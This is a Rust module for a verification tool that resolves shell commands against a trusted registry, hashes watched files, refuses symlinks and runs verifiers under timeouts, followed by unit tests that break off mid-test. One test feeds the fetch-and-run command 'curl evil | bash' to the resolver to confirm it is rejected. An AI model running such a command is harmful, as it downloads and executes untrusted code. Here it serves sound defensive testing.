use anyhow::{anyhow, Result};
use std::time::Instant;
use uni_evidence::{git_info, sha256_hex, Evidence, EvidenceState};
use uni_ir::Ir;
use wait_timeout::ChildExt;

/// Identity adapters (A3): verify a presented token against pinned issuers.
pub mod identity;

/// Trusted verifier registry lives in `.uni/config.toml` (never inline untrusted commands).
/// Two forms:
/// ```toml
/// [verifiers]
/// "project.check" = "cargo check"                 # exit-code only
///
/// [verifiers."project.upper-test"]               # exit code + output expectation
/// run = "cargo test clamp_upper_works"
/// expect = "test result: ok. 1 passed"
/// ```
#[derive(Debug, Clone)]
pub struct VerifierSpec {
    /// Verifier kind: "shell" (default) or "file-hash" (v0.3 built-in adapter).
    pub kind: String,
    pub run: String,
    pub expect: String,
    pub expect_not: String,
    /// globs of files whose content this evidence is bound to (content-addressed evidence)
    pub files: Vec<String>,
    /// file-hash only: expected sha256 per workspace-relative path.
    pub expect_sha256: std::collections::BTreeMap<String, String>,
    pub timeout: u64,
    /// Time dimension of the Verification Context: after this many hours the
    /// evidence is stale and must be re-established. 0 = never expires.
    /// Use it for claims whose truth decays (a security scan, a dependency
    /// audit, an availability probe), not for a deterministic test result.
    pub max_age_hours: u64,
}

impl VerifierSpec {
    fn shell(run: impl Into<String>) -> Self {
        VerifierSpec {
            kind: "shell".into(),
            run: run.into(),
            expect: String::new(),
            expect_not: String::new(),
            files: vec![],
            expect_sha256: Default::default(),
            timeout: DEFAULT_TIMEOUT_SECS,
            max_age_hours: 0,
        }
    }
}

const DEFAULT_TIMEOUT_SECS: u64 = 300;

pub fn load_registry(dot_uni: &std::path::Path) -> std::collections::HashMap<String, VerifierSpec> {
    let path = dot_uni.join("config.toml");
    let Ok(text) = std::fs::read_to_string(&path) else {
        return std::collections::HashMap::new();
    };
    let Ok(val) = text.parse::<toml::Value>() else {
        return std::collections::HashMap::new();
    };
    let mut out = std::collections::HashMap::new();
    if let Some(t) = val.get("verifiers").and_then(|v| v.as_table()) {
        for (k, v) in t {
            if let Some(s) = v.as_str() {
                out.insert(k.clone(), VerifierSpec::shell(s));
            } else if let Some(tbl) = v.as_table() {
                let run = tbl
                    .get("run")
                    .and_then(|r| r.as_str())
                    .unwrap_or("")
                    .to_string();
                let expect = tbl
                    .get("expect")
                    .and_then(|e| e.as_str())
                    .unwrap_or("")
                    .to_string();
                let expect_not = tbl
                    .get("expect_not")
                    .and_then(|e| e.as_str())
                    .unwrap_or("")
                    .to_string();
                let kind = tbl
                    .get("type")
                    .and_then(|t| t.as_str())
                    .unwrap_or("shell")
                    .to_string();
                let files: Vec<String> = tbl
                    .get("files")
                    .and_then(|f| f.as_array())
                    .map(|a| {
                        a.iter()
                            .filter_map(|x| x.as_str().map(|s| s.to_string()))
                            .collect()
                    })
                    .unwrap_or_default();
                let mut expect_sha256 = std::collections::BTreeMap::new();
                match tbl.get("expect_sha256") {
                    Some(toml::Value::String(h)) => {
                        // single-file form: applied to the only watched file
                        if let Some(f) = files.first() {
                            expect_sha256.insert(f.clone(), h.clone());
                        }
                    }
                    Some(toml::Value::Table(m)) => {
                        for (path, h) in m {
                            if let Some(h) = h.as_str() {
                                expect_sha256.insert(path.clone(), h.to_string());
                            }
                        }
                    }
                    _ => {}
                }
                let timeout = tbl
                    .get("timeout")
                    .and_then(|t| t.as_integer())
                    .unwrap_or(DEFAULT_TIMEOUT_SECS as i64) as u64;
                let max_age_hours = tbl
                    .get("max_age_hours")
                    .and_then(|h| h.as_integer())
                    .unwrap_or(0) as u64;
                let usable = (kind == "shell" && !run.is_empty())
                    || (kind == "file-hash" && !expect_sha256.is_empty());
                if usable {
                    out.insert(
                        k.clone(),
                        VerifierSpec {
                            kind,
                            run,
                            expect,
                            expect_not,
                            files,
                            expect_sha256,
                            timeout,
                            max_age_hours,
                        },
                    );
                }
            }
        }
    }
    out
}

/// Resolve the spec for a verification:
/// - inline `shell "..."` allowed only if an allowlisted registry value (bootstrap: empty registry + uni workspace).
/// - otherwise verifier_ref must exist in the registry.
pub fn resolve_command(
    verifier_ref: &str,
    inline_shell: Option<&str>,
    registry: &std::collections::HashMap<String, VerifierSpec>,
) -> Result<VerifierSpec> {
    if verifier_ref == "shell" {
        let cmd = inline_shell.ok_or_else(|| anyhow!("shell verifier needs a command"))?;
        if registry.is_empty() {
            return Ok(VerifierSpec::shell(cmd)); // bootstrap
        }
        if registry.values().any(|v| v.kind == "shell" && v.run == cmd) {
            return Ok(VerifierSpec::shell(cmd));
        }
        return Err(anyhow!(
            "inline shell command not in trusted registry (.uni/config.toml [verifiers]): {cmd}"
        ));
    }
    // registry key, optional inline override must still match registry
    let trusted = registry.get(verifier_ref).ok_or_else(|| {
        anyhow!("unknown verifier '{verifier_ref}' (not in .uni/config.toml [verifiers])")
    })?;
    if let Some(inline) = inline_shell {
        if trusted.kind != "shell" {
            return Err(anyhow!(
                "verifier '{verifier_ref}' is type '{}', not shell: inline overrides are refused",
                trusted.kind
            ));
        }
        if inline != trusted.run {
            return Err(anyhow!(
                "inline override for '{verifier_ref}' does not match trusted registry value"
            ));
        }
    }
    Ok(trusted.clone())
}

/// Per-file hashes are the single source of truth for a watched subject.
/// A missing, unreadable, non-regular or symlinked subject is not evidence:
/// fail closed rather than recording a partial or potentially escaped tree.
/// Paths are relative to the canonical workspace and sorted by BTreeMap.
fn observed_subject(
    spec: &VerifierSpec,
    workspace: &std::path::Path,
) -> Option<std::collections::BTreeMap<String, String>> {
    // File-hash always observes its expected paths, even when a registry
    // author omits the optional files list. Otherwise the adapter can pass
    // without any content binding and incorrectly reuse a cached proof.
    let mut patterns = spec.files.clone();
    if spec.kind == "file-hash" {
        patterns.extend(spec.expect_sha256.keys().cloned());
    }
    if patterns.is_empty() {
        return None;
    }
    let root = std::fs::canonicalize(workspace).ok()?;
    let mut stack = vec![root.clone()];
    let mut found = std::collections::BTreeMap::new();
    // Neither runtime output nor build caches constitute a declared subject.
    let skip = ["target", ".git", ".uni", "evidence"];
    while let Some(dir) = stack.pop() {
        let entries = std::fs::read_dir(&dir).ok()?;
        for entry in entries {
            let entry = entry.ok()?;
            let path = entry.path();
            let rel = path
                .strip_prefix(&root)
                .ok()?
                .to_string_lossy()
                .replace('\\', "/");
            let ty = entry.file_type().ok()?;
            if ty.is_symlink() {
                // A linked directory could introduce entire unobserved subtrees
                // and a linked file could escape the workspace. Reject links
                // anywhere under the non-wildcard prefix of a watched glob.
                if patterns.iter().any(|pat| symlink_may_affect(&rel, pat)) {
                    return None;
                }
                continue;
            }
            if ty.is_dir() {
                let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
                if !skip.contains(&name) {
                    stack.push(path);
                }
            } else if patterns.iter().any(|pat| path_matches_glob(&rel, pat)) {
                if !ty.is_file() {
                    return None;
                }
                found.insert(rel, sha256_hex(&std::fs::read(&path).ok()?));
            }
        }
    }
    (!found.is_empty()).then_some(found)
}

/// A conservative scope check: even a linked child under a watched directory
/// makes the claimed subject unverifiable, whether or not its name happens
/// to match the filename wildcard.
fn symlink_may_affect(rel: &str, pat: &str) -> bool {
    let prefix = pat
        .split('/')
        .take_while(|segment| !segment.contains('*'))
        .collect::<Vec<_>>()
        .join("/");
    prefix.is_empty()
        || rel == prefix
        || rel.starts_with(&format!("{prefix}/"))
        || prefix.starts_with(&format!("{rel}/"))
}

fn segment_matches_glob(segment: &str, pattern: &str) -> bool {
    // '*' matches any number of characters inside one path component.
    // O(n*m), rather than backtracking recursively over attacker-sized names.
    let word = segment.as_bytes();
    let pat = pattern.as_bytes();
    let mut prev = vec![false; word.len() + 1];
    prev[0] = true;
    for &p in pat {
        let mut next = vec![false; word.len() + 1];
        if p == b'*' {
            next[0] = prev[0];
            for i in 1..=word.len() {
                next[i] = prev[i] || next[i - 1];
            }
        } else {
            for i in 1..=word.len() {
                next[i] = prev[i - 1] && word[i - 1] == p;
            }
        }
        prev = next;
    }
    prev[word.len()]
}

fn path_matches_glob(rel: &str, pat: &str) -> bool {
    let pattern: Vec<&str> = pat.split('/').collect();
    let segments: Vec<&str> = rel.split('/').collect();
    fn matches(pattern: &[&str], segments: &[&str]) -> bool {
        let Some(head) = pattern.first() else {
            return segments.is_empty();
        };
        if *head == "**" {
            return (0..=segments.len()).any(|n| matches(&pattern[1..], &segments[n..]));
        }
        let Some(current) = segments.first() else {
            return false;
        };
        segment_matches_glob(current, head) && matches(&pattern[1..], &segments[1..])
    }
    matches(&pattern, &segments)
}

/// Atomic API surface for one enumeration of the watched filesystem tree:
/// the digest and the per-file hashes must refer to the *same* observation.
#[derive(Debug, Default)]
pub struct SubjectSnapshot {
    pub digest: Option<String>,
    pub files: std::collections::BTreeMap<String, String>,
}

pub fn subject_snapshot(spec: &VerifierSpec, workspace: &std::path::Path) -> SubjectSnapshot {
    let Some(files) = observed_subject(spec, workspace) else {
        return SubjectSnapshot::default();
    };
    let manifest = files
        .iter()
        .map(|(rel, hash)| format!("{rel}:{:?};", Some(hash)))
        .collect::<String>();
    SubjectSnapshot {
        digest: Some(sha256_hex(manifest.as_bytes())),
        files,
    }
}

/// Stable per-file hashes of the watched subject, suitable for reporting
/// added, removed, and modified files. Empty means no safely observed subject.
pub fn artifact_hashes(
    spec: &VerifierSpec,
    workspace: &std::path::Path,
) -> std::collections::BTreeMap<String, String> {
    subject_snapshot(spec, workspace).files
}

/// Content-addressed digest of the exact same observed file set as
/// artifact_hashes. Sorting eliminates filesystem enumeration order as input.
pub fn artifact_hash(spec: &VerifierSpec, workspace: &std::path::Path) -> Option<String> {
    subject_snapshot(spec, workspace).digest
}

/// Cache-isolating identity of a verifier spec (prevents evidence reuse
/// across contracts that merely share a claim id) AND of the actor that
/// produced the proof: a proof by actor A never silently satisfies a run
/// as actor B (Evidence Completeness Principle). The executor is NOT part
/// of the key: on a cache hit the caller refreshes it to the current
/// executor, because independence is evaluated in the reusing context.
/// Template token a registry command may use to defer the test selector to an
/// authorized binding: the worker picks the test name, the human authorizes
/// which test counts as evidence.
pub const SELECTOR_TOKEN: &str = "{{selector}}";

pub fn is_selector_template(spec: &VerifierSpec) -> bool {
    spec.kind == "shell" && spec.run.contains(SELECTOR_TOKEN)
}

/// A verifier with a test name baked into the command (ADR-002). The study
/// measured this as the cause of every false rejection (3/3): the contract
/// demands a name the worker was never told, correct work is refused. The
/// blessed pattern is a `{{selector}}` template (worker names the test, human
/// authorizes it with `uni bind --selector`) plus `uni brief` as the handoff.
pub fn pinned_test_selector(spec: &VerifierSpec) -> bool {
    if spec.kind != "shell" || is_selector_template(spec) {
        return false;
    }
    let run = spec.run.as_str();
    // `cargo test <name> -- --exact`: single-test selection with a literal.
    // Bare `cargo test`, target flags (`--test …`), and option-first
    // invocations select suites, not names, and are not pinned. Tokens are
    // matched whole, so `mycargo test` is not cargo.
    let toks: Vec<&str> = run.split_whitespace().collect();
    for w in toks.windows(3) {
        if w[0] == "cargo" && w[1] == "test" && !w[2].starts_with('-') && !w[2].contains("{{") {
            return true;
        }
    }
    // `node --test --test-name-pattern "literal"` (without a template hole).
    if run.contains("--test-name-pattern") && !run.contains("{{") {
        return true;
    }
    // `python -m unittest dotted.path` (but not `unittest discover …`).
    if run.contains("unittest") && !run.contains("discover") && !run.contains("{{") {
        let mut prev = "";
        for tok in run.split_whitespace() {
            if prev == "unittest" && !tok.starts_with('-') {
                return true;
            }
            prev = tok;
        }
    }
    false
}

/// Substitute the authorized selector into a template verifier. Returns an
/// error when the template has no selector to substitute: guessing one would
/// put resolution back in the trust path.
pub fn with_selector(spec: &VerifierSpec, selector: Option<&str>) -> Result<VerifierSpec> {
    if !is_selector_template(spec) {
        return Ok(spec.clone());
    }
    let Some(sel) = selector.filter(|s| !s.trim().is_empty()) else {
        return Err(anyhow!(
            "verifier '{}' is a selector template but no selector is authorized (uni bind --selector <test-name>)",
            spec.run
        ));
    };
    let mut out = spec.clone();
    out.run = spec.run.replace(SELECTOR_TOKEN, sel);
    Ok(out)
}

pub fn spec_fingerprint(verifier_ref: &str, spec: &VerifierSpec, actor_id: &str) -> String {
    let seed = format!(
        "{verifier_ref}|{}|{}|{}|{}|actor:{actor_id}",
        spec.run,
        spec.expect,
        spec.expect_not,
        spec.files.join(",")
    );
    sha256_hex(seed.as_bytes())[..12].to_string()
}

pub fn run_spec(
    claim_id: &str,
    verifier_ref: &str,
    spec: &VerifierSpec,
    workspace: &std::path::Path,
    _timeout_secs: u64,
    actor: &uni_evidence::Actor,
    executor: &uni_evidence::Actor,
) -> Result<Evidence> {
    let verifier = verifier_for(spec)?;
    // Record the declared input before executing a potentially mutating
    // verifier. A proof for an old input must not be stamped onto new bytes.
    let before = subject_snapshot(spec, workspace);
    let started = Instant::now();
    let outcome = verifier.run(spec, workspace)?;
    let mut ev = build_evidence(
        claim_id,
        verifier.name(),
        &outcome.command,
        &outcome,
        workspace,
    );
    ev.duration_ms = started.elapsed().as_millis();
    let subject = subject_snapshot(spec, workspace);
    let changed_during_run = before.digest.is_some() && before.digest != subject.digest;
    ev.artifact_files = subject.files;
    ev.artifact_hash = subject.digest.unwrap_or_default();
    if changed_during_run {
        // A previously existing watched subject was modified (or disappeared)
        // while the verifier was running. In contrast, a fresh generated
        // output that did not exist before is checked by its post-run digest.
        ev.state = EvidenceState::Invalid;
        ev.output_excerpt
            .push_str("\n[uni] watched subject changed during verifier execution; proof refused");
    }
    // Time dimension: a proof whose truth decays carries its own expiry, so the
    // loader needs no registry access to honour it.
    if spec.max_age_hours > 0 {
        ev.expires_at = Some(
            ev.created_at + chrono::Duration::hours(spec.max_age_hours.min(i64::MAX as u64) as i64),
        );
    }
    // Evidence Completeness Principle: a verifier that declares watched files
    // it cannot observe has not covered its subject. Storing that as "no
    // binding" would let a later appearance of the files count as a cache hit.
    if !spec.files.is_empty() && ev.artifact_hash.is_empty() {
        ev.state = EvidenceState::Invalid;
    }
    ev.fingerprint = spec_fingerprint(verifier_ref, spec, &actor.id);
    ev.actor = actor.clone();
    ev.executor = executor.clone();
    // Adapters that declare their own content binding (file-hash checks exact
    // hashes) must not be silently re-bound by globs: keep their state, but
    // still bind the watched files for invalidation.
    // Expectations are checked against the FULL output, never the truncated excerpt.
    if !spec.expect.is_empty() && !outcome.output.contains(&spec.expect) {
        ev.state = EvidenceState::Invalid;
    }
    if !spec.expect_not.is_empty() && outcome.output.contains(&spec.expect_not) {
        ev.state = EvidenceState::Invalid;
    }
    Ok(ev)
}

/// Public verifier seam (v0.3). A verifier turns a trusted spec into raw
/// observations; run_spec wraps them into Evidence with all bindings.
///
/// Contract for implementers (see docs/writing-verifiers.md):
///  1. deterministic: no network, no clock, no RNG in the pass/fail decision
///  2. report raw exit/observations; never decide acceptance (that is the engine)
///  3. never read the contract: only the authorized spec and the workspace
pub trait Verifier {
    /// Producer name recorded on Evidence.
    fn name(&self) -> &'static str;
    fn run(&self, spec: &VerifierSpec, workspace: &std::path::Path) -> Result<VerifierOutcome>;
}

pub struct VerifierOutcome {
    pub state: EvidenceState,
    pub exit_code: i32,
    pub command: String,
    pub output: String,
}

pub struct ShellVerifier;
pub struct FileHashVerifier;

/// File-hash is a local adapter: neither an absolute path, a parent traversal,
/// nor a symlink in any path component may redirect an expected file outside
/// the workspace (even when the expected digest happens to match).
fn checked_file_hash_path(
    workspace: &std::path::Path,
    relative: &str,
) -> Result<std::path::PathBuf> {
    use std::path::Component;
    let path = std::path::Path::new(relative);
    if relative.is_empty()
        || !path
            .components()
            .all(|component| matches!(component, Component::Normal(_)))
    {
        return Err(anyhow!(
            "expected file path must be workspace-relative without traversal"
        ));
    }
    let mut resolved = std::fs::canonicalize(workspace)?;
    for component in path.components() {
        resolved.push(component.as_os_str());
        let info = std::fs::symlink_metadata(&resolved)?;
        if info.file_type().is_symlink() {
            return Err(anyhow!("expected file path crosses a symlink"));
        }
    }
    Ok(resolved)
}

impl Verifier for ShellVerifier {
    fn name(&self) -> &'static str {
        "shell-verifier"
    }
    fn run(&self, spec: &VerifierSpec, workspace: &std::path::Path) -> Result<VerifierOutcome> {
        let (code, output) = run_shell(&spec.run, workspace, spec.timeout)?;
        Ok(VerifierOutcome {
            state: if code == 0 {
                EvidenceState::Valid
            } else {
                EvidenceState::Invalid
            },
            exit_code: code,
            command: spec.run.clone(),
            output,
        })
    }
}

/// file-hash: no process runs. Each expected path must exist and its sha256
/// must equal the expected value; any mismatch or missing file is Invalid.
impl Verifier for FileHashVerifier {
    fn name(&self) -> &'static str {
        "file-hash-verifier"
    }
    fn run(&self, spec: &VerifierSpec, workspace: &std::path::Path) -> Result<VerifierOutcome> {
        let mut lines = vec![];
        let mut ok = true;
        for (rel, expected) in &spec.expect_sha256 {
            let path = match checked_file_hash_path(workspace, rel) {
                Ok(path) => path,
                Err(reason) => {
                    ok = false;
                    let missing = reason
                        .downcast_ref::<std::io::Error>()
                        .map(|error| error.kind() == std::io::ErrorKind::NotFound)
                        .unwrap_or(false);
                    lines.push(format!(
                        "{rel}: {} ({reason})",
                        if missing { "MISSING" } else { "UNSAFE" }
                    ));
                    continue;
                }
            };
            match std::fs::read(&path) {
                Ok(bytes) => {
                    let actual = sha256_hex(&bytes);
                    let match_ = actual == *expected;
                    ok &= match_;
                    lines.push(format!(
                        "{rel}: {} (expected {})",
                        if match_ { "MATCH" } else { "MISMATCH" },
                        &expected[..12.min(expected.len())]
                    ));
                }
                Err(e) => {
                    ok = false;
                    lines.push(format!("{rel}: MISSING ({e})"));
                }
            }
        }
        let command = format!(
            "file-hash: {}",
            spec.expect_sha256
                .keys()
                .cloned()
                .collect::<Vec<_>>()
                .join(", ")
        );
        Ok(VerifierOutcome {
            state: if ok {
                EvidenceState::Valid
            } else {
                EvidenceState::Invalid
            },
            exit_code: if ok { 0 } else { 1 },
            command,
            output: lines.join("\n"),
        })
    }
}

/// Select the built-in adapter for a spec. Unknown kinds are a hard error:
/// a registry typo must never silently fall back to running a command.
pub fn verifier_for(spec: &VerifierSpec) -> Result<Box<dyn Verifier>> {
    match spec.kind.as_str() {
        "shell" => Ok(Box::new(ShellVerifier)),
        "file-hash" => Ok(Box::new(FileHashVerifier)),
        other => Err(anyhow!(
            "unknown verifier type '{other}' (built-ins: shell, file-hash)"
        )),
    }
}

fn run_shell(
    command: &str,
    workspace: &std::path::Path,
    timeout_secs: u64,
) -> Result<(i32, String)> {
    // Shell selection is platform-gated (sh on POSIX, cmd on Windows) and the
    // timeout is always enforced natively: the old `timeout`-binary hack is
    // gone, along with its two silent failure modes (binary missing on macOS,
    // wrong `timeout` semantics on Windows cmd).
    #[cfg(windows)]
    let mut cmd = {
        let mut c = std::process::Command::new("cmd");
        c.args(["/C", command]).current_dir(workspace);
        c.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        c
    };
    #[cfg(not(windows))]
    let mut cmd = {
        let mut c = std::process::Command::new("sh");
        c.args(["-c", command]).current_dir(workspace);
        c.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());
        c
    };
    let mut child = cmd.spawn()?;
    let timeout = std::time::Duration::from_secs(timeout_secs.max(1));
    let (code, combined) = match child.wait_timeout(timeout)? {
        Some(_status) => {
            let out = child.wait_with_output()?;
            (
                out.status.code().unwrap_or(-1),
                [out.stdout, out.stderr].concat(),
            )
        }
        None => {
            // Timeout: kill, reap, and record the kill as failure, never as pass.
            let _ = child.kill();
            let out = child.wait_with_output()?;
            let mut combined = [out.stdout, out.stderr].concat();
            combined.extend_from_slice(
                format!("\n[uni] verifier killed after {timeout_secs}s timeout").as_bytes(),
            );
            (-1, combined)
        }
    };
    let full_output = String::from_utf8_lossy(&combined).to_string();
    Ok((code, full_output))
}

fn build_evidence(
    claim_id: &str,
    producer: &str,
    command: &str,
    outcome: &VerifierOutcome,
    workspace: &std::path::Path,
) -> Evidence {
    let (commit_sha, workspace_dirty) = git_info(workspace);
    let excerpt: String = outcome.output.chars().take(2000).collect();
    Evidence {
        id: format!("{claim_id}-{}", &sha256_hex(command.as_bytes())[..8]),
        claim_id: claim_id.to_string(),
        producer: producer.to_string(),
        command: command.to_string(),
        exit_code: outcome.exit_code,
        output_hash: sha256_hex(outcome.output.as_bytes()),
        output_excerpt: excerpt,
        commit_sha,
        workspace_dirty,
        state: outcome.state.clone(),
        created_at: chrono::Utc::now(),
        duration_ms: 0,
        artifact_hash: String::new(),
        artifact_files: Default::default(),
        fingerprint: String::new(),
        // Verification Context dimensions are filled by the caller (cmd_verify),
        // which owns the registry/contract/policy view of the run.
        registry_hash: String::new(),
        policy_hash: String::new(),
        contract_hash: String::new(),
        platform: String::new(),
        // Identities are attached by run_spec (caller owns the actor view).
        actor: uni_evidence::Actor::default(),
        executor: uni_evidence::Actor::default(),
        // Authorization is attached by cmd_verify from the loaded binding.
        binding_hash: String::new(),
        // Expiry is attached by run_spec from the verifier spec.
        expires_at: None,
    }
}

/// High seam: assure a full contract in one call (used by CLI + tests).
pub fn assure_contract(
    ir: &Ir,
    dot_uni: &std::path::Path,
    workspace: &std::path::Path,
) -> Result<Vec<Evidence>> {
    let registry = load_registry(dot_uni);
    let actor = uni_evidence::Actor::local();
    let mut out = vec![];
    for v in &ir.verification {
        let spec = resolve_command(&v.verifier_ref, v.inline_shell.as_deref(), &registry)?;
        out.push(run_spec(
            &v.claim_id,
            &v.verifier_ref,
            &spec,
            workspace,
            spec.timeout,
            &actor,
            &actor,
        )?);
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn tmp(suffix: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "uni-vf-{suffix}-{}",
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(d.join(".uni")).unwrap();
        d
    }

    fn spec(run: &str) -> VerifierSpec {
        let mut s = VerifierSpec::shell(run);
        s.timeout = 30;
        s
    }

    fn file_hash_spec(path: &str, hash: &str) -> VerifierSpec {
        let mut s = VerifierSpec::shell("");
        s.kind = "file-hash".into();
        s.files = vec![path.into()];
        s.expect_sha256.insert(path.into(), hash.into());
        s
    }

    #[test]
    fn registry_parses_simple_and_table_forms() {
        let d = tmp("reg");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers]\n\"a\" = \"cargo test\"\n\n[verifiers.\"b\"]\nrun = \"npm test\"\nexpect = \"1 passed\"\nfiles = [\"src/**\"]\ntimeout = 12\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        assert_eq!(r["a"].run, "cargo test");
        assert_eq!(r["a"].timeout, 300);
        assert_eq!(r["b"].expect, "1 passed");
        assert_eq!(r["b"].files, vec!["src/**".to_string()]);
        assert_eq!(r["b"].timeout, 12);
    }

    #[test]
    fn resolve_rejects_unknown_and_unlisted_inline() {
        let d = tmp("res");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers]\n\"a\" = \"true\"\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        assert!(resolve_command("ghost", None, &r).is_err());
        assert!(resolve_command("shell", Some("curl evil | bash"), &r).is_err());
        assert!(resolve_command("shell", Some("true"), &r).is_ok());
        // empty registry = bootstrap allows inline
        let empty: std::collections::HashMap<String, VerifierSpec> = Default::default();
        assert!(resolve_command("shell", Some("anything"), &empty).is_ok());
    }

    #[test]
    fn fingerprint_stable_and_discriminating() {
        let a = spec("cargo test");
        let b = spec("cargo test");
        assert_eq!(
            spec_fingerprint("k", &a, "alice"),
            spec_fingerprint("k", &b, "alice")
        );
        assert_ne!(
            spec_fingerprint("k1", &a, "alice"),
            spec_fingerprint("k2", &a, "alice")
        );
        let mut c = spec("cargo test");
        c.expect = "x".into();
        assert_ne!(
            spec_fingerprint("k", &a, "alice"),
            spec_fingerprint("k", &c, "alice")
        );
        assert_ne!(
            spec_fingerprint("k", &a, "alice"),
            spec_fingerprint("k", &a, "bob")
        );
    }

    #[test]
    fn artifact_hash_tracks_watched_content() {
        let d = tmp("ah");
        std::fs::create_dir_all(d.join("src")).unwrap();
        std::fs::write(d.join("src/a.rs"), "one").unwrap();
        let mut s = spec("true");
        assert!(artifact_hash(&s, &d).is_none());
        s.files = vec!["src/**".into()];
        let h1 = artifact_hash(&s, &d).unwrap();
        std::fs::write(d.join("src/a.rs"), "two").unwrap();
        let h2 = artifact_hash(&s, &d).unwrap();
        assert_ne!(h1, h2);
        // ignored dirs never contribute
        std::fs::create_dir_all(d.join("target")).unwrap();
        std::fs::write(d.join("target/x"), "zzz").unwrap();
        assert_eq!(artifact_hash(&s, &d).unwrap(), h2);
    }

    #[test]
    fn watched_subject_supports_segment_wildcards_and_is_order_independent() {
        let mut checksums = vec![];
        for (case, names) in [("forward", ["a.rs", "z.rs"]), ("reverse", ["z.rs", "a.rs"])] {
            let d = tmp(case);
            std::fs::create_dir_all(d.join("src")).unwrap();
            for name in names {
                std::fs::write(d.join("src").join(name), name.as_bytes()).unwrap();
            }
            std::fs::write(d.join("src/ignored.txt"), "ignore").unwrap();
            let mut s = spec("true");
            s.files = vec!["src/*.rs".into()];
            let watched = artifact_hashes(&s, &d);
            assert_eq!(watched.len(), 2, "src/*.rs should cover both Rust files");
            s.files = vec!["src/**".into()];
            checksums.push(artifact_hash(&s, &d).expect("observed subject is hashable"));
        }
        assert_eq!(
            checksums[0], checksums[1],
            "identical subjects must hash identically across creation order"
        );
    }

    #[cfg(unix)]
    #[test]
    fn watched_subject_refuses_symlinks_instead_of_following_outside_workspace() {
        use std::os::unix::fs::symlink;

        let d = tmp("symlink-escape");
        std::fs::create_dir_all(d.join("src")).unwrap();
        std::fs::create_dir_all(d.join("elsewhere")).unwrap();
        std::fs::write(d.join("src/safe.txt"), "good").unwrap();
        std::fs::write(d.join("elsewhere/secret.txt"), "outside subject").unwrap();

        let mut s = spec("true");
        s.files = vec!["src/**".into()];
        // A symlinked file must not sneak into a trusted watched subject.
        symlink(d.join("elsewhere/secret.txt"), d.join("src/alias.txt")).unwrap();
        assert!(
            artifact_hash(&s, &d).is_none(),
            "a linked file must fail closed, not hash a target elsewhere"
        );
        let evidence = run_spec(
            "watched",
            "trusted",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(evidence.state, EvidenceState::Invalid);

        std::fs::remove_file(d.join("src/alias.txt")).unwrap();
        symlink(d.join("elsewhere"), d.join("src/external")).unwrap();
        assert!(
            artifact_hash(&s, &d).is_none(),
            "directory links must never let watched globs escape the workspace"
        );
    }

    #[test]
    fn verifier_must_not_accept_a_subject_modified_during_its_own_run() {
        let d = tmp("inflight-drift");
        std::fs::write(d.join("watched.txt"), "before").unwrap();
        let mut s = spec("echo changed > watched.txt");
        s.files = vec!["watched.txt".into()];
        let ev = run_spec(
            "inflight",
            "owner.verifier",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(
            ev.state,
            EvidenceState::Invalid,
            "a proof must not be bound to bytes modified while the verifier ran"
        );
    }

    #[test]
    fn verifier_can_prove_an_output_first_created_by_its_command() {
        let d = tmp("generated-output");
        let mut s = spec("echo generated > output.txt");
        s.files = vec!["output.txt".into()];
        let ev = run_spec(
            "generated",
            "owner.verifier",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev.state, EvidenceState::Valid);
        assert!(ev.artifact_files.contains_key("output.txt"));
    }
    #[test]
    fn run_spec_applies_expect_matchers_on_full_output() {
        let d = tmp("run");
        let mut s = spec("printf 'aaaa' && echo MARK");
        s.expect = "MARK".into();
        let ev = run_spec(
            "c",
            "k",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev.state, uni_evidence::EvidenceState::Valid);
        s.expect_not = "MARK".into();
        let ev2 = run_spec(
            "c",
            "k",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev2.state, uni_evidence::EvidenceState::Invalid);
        let mut s3 = spec("false");
        s3.expect = String::new();
        let ev3 = run_spec(
            "c",
            "k",
            &s3,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        assert_eq!(ev3.state, uni_evidence::EvidenceState::Invalid);
        assert!(!ev3.fingerprint.is_empty());
    }

    /// Timeout is enforced natively on every platform: a hanging verifier is
    /// killed and recorded Invalid, never silently awaited forever.
    #[cfg(not(windows))]
    #[test]
    fn hanging_verifier_is_killed_and_invalid() {
        let d = tmp("timeout");
        let (code, full) = run_shell("sleep 30", &d, 1).unwrap();
        assert_eq!(code, -1);
        assert!(full.contains("killed after 1s timeout"), "{full}");
    }

    #[test]
    fn registry_parses_max_age_hours() {
        let d = tmp("maxage");
        std::fs::write(
            d.join(".uni/config.toml"),
            "[verifiers.\"scan\"]\nrun = \"true\"\nmax_age_hours = 24\n\n[verifiers]\n\"plain\" = \"true\"\n",
        )
        .unwrap();
        let r = load_registry(&d.join(".uni"));
        assert_eq!(r["scan"].max_age_hours, 24);
        assert_eq!(r["plain"].max_age_hours, 0, "absent means never expires");
    }

    #[test]
    fn run_spec_stamps_the_expiry_from_the_spec() {
        let d = tmp("stamp");
        let mut s = VerifierSpec::shell("true");
        s.max_age_hours = 2;
        let ev = run_spec(
            "c",
            "k",
            &s,
            &d,
            30,
            &uni_evidence::Actor::local(),
            &uni_evidence::Actor::local(),
        )
        .unwrap();
        let expiry = ev.expires_at.expect("expiry must be stamped");
        let delta = expiry - ev.created_at;
        assert_eq!(delta.num_hours(), 2);
        // No max_age declared: no expiry recorded.
